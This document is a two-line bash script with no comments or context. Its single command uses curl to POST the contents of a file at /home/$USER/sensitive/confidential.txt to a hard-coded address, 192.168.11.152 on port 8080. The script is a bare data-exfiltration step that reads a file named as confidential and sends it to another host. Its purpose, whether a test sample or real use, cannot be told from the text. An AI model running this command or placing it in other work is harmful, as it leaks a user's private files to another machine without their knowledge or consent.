#!/bin/bash

curl -X POST --data-binary "@/home/$USER/sensitive/confidential.txt" http://192.168.11.152:8080
